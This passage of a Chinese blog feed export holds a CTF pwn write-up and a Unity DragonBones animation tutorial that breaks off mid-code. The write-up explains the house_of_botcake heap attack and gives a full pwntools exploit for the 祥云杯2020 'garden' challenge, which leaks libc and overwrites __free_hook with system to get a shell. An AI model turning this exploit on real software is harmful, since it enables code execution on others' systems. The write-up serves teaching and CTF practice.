class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><p>之后，我们再释放掉a chunk  和prev chunk ，由于tachebins 满了，a chunk 和prev chunk 将加入 unsortedbin中。同时由于a chunk 和prev chunk 相邻，a chunk 和prev chunk 将合并成为一个大的chunk 放入 unsortedbin。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Step 2: free the victim chunk so it will be added to unsorted bin"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Step 3: free the previous chunk and make it consolidate with the victim chunk."</span>);</span><br><span class="line"><span class="built_in">free</span>(prev);</span><br></pre></td></tr></table></figure><p>这时，我们从tachebins中取出一个chunk：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><p>这样我们tachebins中就只有6个 chunk了，这时我们再free a chunk。由于tachebins未满，所以我们的a chunk将会加入tachebins中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"><span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Now we have the chunk overlapping primitive:"</span>);</span><br><span class="line"><span class="keyword">int</span> prev_size = prev[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line"><span class="keyword">int</span> a_size = a[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"prev @ %p, size: %#x, end @ %p\n"</span>, prev, prev_size, (<span class="keyword">void</span> *)prev+prev_size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"victim @ %p, size: %#x, end @ %p\n"</span>, a, a_size, (<span class="keyword">void</span> *)a+a_size);</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">prev[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>)] = <span class="number">0x41414141</span>;</span><br><span class="line">assert(a[<span class="number">0</span>] == <span class="number">0x41414141</span>);</span><br></pre></td></tr></table></figure><p><img src="image-20220615102654063.png" alt="image-20220615102654063"></p><p>于是，a chunk即在tachebins中，又和prev chunk一起在 unsortedbin 中。这样我们就完成house_of_botcake攻击。可以进而通过prev chunk 用 A chunk进行任意地址写。 </p><h2 id="例题解析-祥云杯2020-garden"><a href="#例题解析-祥云杯2020-garden" class="headerlink" title="例题解析-祥云杯2020-garden"></a>例题解析-祥云杯2020-garden</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="image-20220615221726509.png" alt="image-20220615221726509"></p><p>题目保护全开，同时是2.31版本。</p><p>分析流程，发现题目只有添加chunk，释放，显示内容，退出四种功能。</p><p>但用两种添加chunk和释放chunk的功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tree index?"</span>);</span><br><span class="line">  v1 = sub_11C5();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">8</span> || qword_4060[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid index"</span>);</span><br><span class="line">  qword_4060[v1] = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tree name?"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)qword_4060[v1], <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很平凡的添加功能，但只能申请0x100大小空间的chunk(0x110).且只能申请8个.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_4050 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"do you want to name the garden?"</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  result = <span class="built_in">puts</span>(<span class="string">"sorry, you can't"</span>);</span><br><span class="line">  dword_4050 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只能调用一次的，添加功能但可以申请0x20大小空间的chunk（0x30）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tree index?"</span>);</span><br><span class="line">  v2 = sub_11C5();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">8</span> &amp;&amp; qword_4060[v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_4060[v2]);</span><br><span class="line">    v0 = qword_4060;</span><br><span class="line">    qword_4060[v2] = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"invalid index"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很常见的正常释放chunk操作，再free chunk 后，会清空指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_4054 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"which tree do you want to steal?"</span>);</span><br><span class="line">  v0 = sub_11C5();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> &amp;&amp; v0 &lt;= <span class="number">8</span> &amp;&amp; qword_4060[v0] )</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_4060[v0]);</span><br><span class="line">  dword_4054 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在free chunk 后，不会清空指针。但是只能清空一次。</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>我们可以，释放8个0x100chunk,让一个chunk 加入 unsorted bin 中，再利用name()函数，让 unsorted bin 大小小于0x100 。</p><p>我们再在add 8 个0x100 chunk，这时unsorted bin (小于0x100) 也不会利用。</p><p>释放 unsorted bin 后面相邻0x100 chunk（a chunk） ,并保留指针。两个chunk 合并成大的unsorted bin</p><p> chunk。</p><p>再add 一个 0x100 chunk，让  tcache 未满，再free  a chunk 这时 a chunk进入  0x100 chunk。但同时也在于unsorted bin中。形成重叠。</p><p>再利用重叠部分uaf泄露libc，再修改fd进行任意地址写，在<code>__free_hook</code>写入后门。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/06/15 16:46:39</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./garden'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">ip_port=[<span class="string">''</span>,]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,text)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'tree index?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'tree name?'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'tree index?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_0</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'which tree do you want to steal?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'tree index?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="string">'1111'</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#free(4)</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">name()  <span class="comment">#制造0xe0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="string">'1111'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#free(2)</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">free_0(<span class="number">2</span>) <span class="comment">#让0x100与0xe0合并制造出unsertedbin 效果</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'1'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'xx'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">''</span>)</span><br><span class="line">show(<span class="number">8</span>)<span class="comment">#泄露libc地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#传统劫持tache，任意地址写</span></span><br><span class="line">addr=(u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">malloc_hook=addr+<span class="number">0x26</span></span><br><span class="line">log.info(hex(malloc_hook))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">x=finder(<span class="string">'__malloc_hook'</span>,malloc_hook)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">'t'</span>*<span class="number">0xe0</span>+p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">add(<span class="number">3</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在unity中使用DragonBones骨骼的方法</title>
      <link href="/2022/05/16/%E5%9C%A8unity%E4%B8%AD%E4%BD%BF%E7%94%A8DragonBones%E9%AA%A8%E9%AA%BC/"/>
      <url>/2022/05/16/%E5%9C%A8unity%E4%B8%AD%E4%BD%BF%E7%94%A8DragonBones%E9%AA%A8%E9%AA%BC/</url>
      
        <content type="html"><![CDATA[<p>最近跑路的事情稳了，又拿出2019年设计的小游戏草案在那里改。找文章发现DragonBones骨骼可以用来unity中使用。但项目需求使用时，踩了很多坑。<a id="more"></a></p><h2 id="导入插件"><a href="#导入插件" class="headerlink" title="导入插件"></a>导入插件</h2><p>在github(<a href="https://github.com/DragonBones/DragonBonesCSharp" target="_blank" rel="noopener">https://github.com/DragonBones/DragonBonesCSharp</a>) 下载插件.</p><p>然后：</p><ol><li>创建一个 Unity 项目或使用上述示例项目。</li><li>分别复制 <a href="https://github.com/DragonBones/DragonBonesCSharp/blob/master/DragonBones/src" target="_blank" rel="noopener">DragonBones 公共库源码</a>、<a href="https://github.com/DragonBones/DragonBonesCSharp/blob/master/Unity/src" target="_blank" rel="noopener">DragonBones Unity 库源码</a>、<a href="https://github.com/DragonBones/DragonBonesCSharp/blob/master/3rdParty" target="_blank" rel="noopener">第三方库源码</a> 中的所有文件夹和文件到项目的 Assets/Scripts 文件夹下。</li><li>运行项目。</li></ol><p>确保项目结构如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Your project</span><br><span class="line">    |-- Assets</span><br><span class="line">        |-- DragonBones</span><br><span class="line">            |-- Demos (如果不需要，可以删除。)</span><br><span class="line">            |-- Scripts        </span><br><span class="line">                |-- 3rdParty</span><br><span class="line">                |-- animation</span><br><span class="line">                |-- armature</span><br><span class="line">                |-- ...</span><br><span class="line">                |-- unity</span><br><span class="line">                |-- ...</span><br><span class="line">            |-- Editor</span><br><span class="line">            |-- Resources</span><br><span class="line">                |-- Shaders files</span><br><span class="line">                |-- ...</span><br><span class="line">            |-- ...</span><br><span class="line">        |-- Resources</span><br><span class="line">            |-- DragonBonesData files</span><br><span class="line">            |-- ...</span><br><span class="line">        |-- Scripts</span><br><span class="line">        |-- ...</span><br><span class="line">    |-- ...</span><br><span class="line">&#96;&#96;&#96;-- ...</span><br></pre></td></tr></table></figure><h2 id="素材导入"><a href="#素材导入" class="headerlink" title="素材导入"></a>素材导入</h2><h3 id="图像界面导入"><a href="#图像界面导入" class="headerlink" title="图像界面导入"></a>图像界面导入</h3><p>unity图像界面导入DragonBones骨骼比较简单。分为Data数据导入和直接法。</p><h4 id="直接导入"><a href="#直接导入" class="headerlink" title="直接导入"></a>直接导入</h4><p>在插件导入后，我们就点击右键ske文件，点击DragonBones中<code>Armature Object</code>,可以生成DragonBones骨骼动画对象。</p><p><img src="image-20220520110016570.png" alt="image-20220520110016570"></p><h4 id="Data数据"><a href="#Data数据" class="headerlink" title="Data数据"></a>Data数据</h4><p>在插件导入后，我们就点击右键ske文件，点击DragonBones中<code>Create Unity Data</code>,可以生成data文件。</p><p><img src="image-20220520101926214.png" alt="image-20220520101926214"></p><p>在把文件拖入DragonBones对象里。</p><p><img src="image-20220520105643528.png" alt="image-20220520105643528"></p><h3 id="代码导入"><a href="#代码导入" class="headerlink" title="代码导入"></a>代码导入</h3><p>参照官方demo教程–<code>HelloDragonBones.cs</code>改动的，纯代码导入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">using System.Collections;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using UnityEngine;</span><br><span class="line">using DragonBones;</span><br><span class="line">public class testal : MonoBehaviour&#x2F;&#x2F;BaseDemo &#x2F;&#x2F;MonoBehaviour</span><br><span class="line">&#123;  </span><br><span class="line">    private UnityDragonBonesData dragonBoneData;</span><br><span class="line">    &#x2F;&#x2F; Update is called once per frame</span><br><span class="line">    &#x2F;&#x2F; Start is called before the first frame update</span><br><span class="line">    &#x2F;&#x2F; protected override void OnStart()</span><br><span class="line">    void Start()</span><br><span class="line">    &#123;</span><br><span class="line">        dragonBoneData&#x3D;UnityEditor.AssetDatabase.LoadAssetAtPath&lt;UnityDragonBonesData&gt;(&quot;Assets&#x2F;ylw&#x2F;xlw_Data.asset&quot;);</span><br><span class="line">        &#x2F;&#x2F; 1.Load and parse data</span><br><span class="line">       &#x2F;&#x2F; Debug.Log(dragonBoneData.dragonBonesJSON);</span><br><span class="line">        if (true)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; Scheme 1: Load UnityDragonBonesData</span><br><span class="line">            UnityFactory.factory.LoadData(this.dragonBoneData);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; Scheme 2: Load JsonData in Resources</span><br><span class="line">             &#x2F;&#x2F;UnityFactory.factory.LoadDragonBonesData(&quot;&#x2F;Assets&#x2F;ylw&#x2F;xlw_ske.json&quot;);</span><br><span class="line">             &#x2F;&#x2F;UnityFactory.factory.LoadTextureAtlasData(&quot;&#x2F;Assets&#x2F;ylw&#x2F;xlw_tex.json&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 2.Build armature</span><br><span class="line">        var armatureComponent &#x3D; UnityFactory.factory.BuildArmatureComponent(&quot;animx&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 3.Play animation</span><br><span class="line">        armatureComponent.animation.Play(&quot;stand&quot;);</span><br><span class="line">       </span><br><span class="line">        &#x2F;&#x2F; Set name</span><br><span class="line">        armatureComponent.name &#x3D; &quot;dynamic_mecha_1002_101d&quot;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Set position.</span><br><span class="line"></span><br><span class="line">        armatureComponent.transform.localPosition &#x3D; new Vector3(3.0f, -1.5f, 1.0f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Update is called once per frame</span><br><span class="line">    void Update()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里要注意的是<code>UnityFactory.factory.BuildArmatureComponent()</code>函数的参数与ske文件中的<code>armature</code>属性里的<code>name</code>的值相关，两者要一致。</p><p>同时，如果是<strong>高版本素材</strong>推荐用<strong>scheme1</strong>导入，<strong>低版本</strong>用<strong>scheme2</strong>。否则，代码导入后有蜜汁bug。</p><p>另外代码导入时，确保正确生成了mat文件，否则也有蜜汁bug。官方代码里先读取文件再判断是否生成orw。。。。</p><h2 id="用代码获得骨骼动画对象"><a href="#用代码获得骨骼动画对象" class="headerlink" title="用代码获得骨骼动画对象"></a>用代码获得骨骼动画对象</h2><p>我们在导入unity后,我们可以通过UnityArmatureComponent控件来管理我们DragonBones骨骼动画。</p><p>我们可以GETcomponent来获取我们的DragonBones骨骼动画对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public DragonBones.UnityArmatureComponent anmi;</span><br><span class="line">anmi&#x3D;xxx.GetComponent&lt;DragonBones.UnityArmatureComponent&gt;();</span><br></pre></td></tr></table></figure><p>也可以直接使用拖拽法</p><p><img src="image-20220517113029077.png" alt="image-20220517113029077"></p><h2 id="用代码控制骨骼动画播放"><a href="#用代码控制骨骼动画播放" class="headerlink" title="用代码控制骨骼动画播放"></a>用代码控制骨骼动画播放</h2><p>官方提供的获得控制骨骼动画播放与播放状态属性的API，这些与播放相关的API多数放在animation属性下。</p><p>具体API简略整理如下：</p><h3 id="通过指定的动画配置来播放动画"><a href="#通过指定的动画配置来播放动画" class="headerlink" title="通过指定的动画配置来播放动画"></a>通过指定的动画配置来播放动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState PlayConfig(AnimationConfig animationConfig)</span><br></pre></td></tr></table></figure><p> 通过指定的动画配置来播放动画。 该 API 仍在实验阶段，使用时可能遭遇 bug 或稳定性或兼容性问题。</p><p>参数：</p><p><code>animationConfig</code>：是指动画配置。</p><h3 id="播放指定动画"><a href="#播放指定动画" class="headerlink" title="播放指定动画"></a>播放指定动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState Play(string animationName &#x3D; null, int playTimes &#x3D; 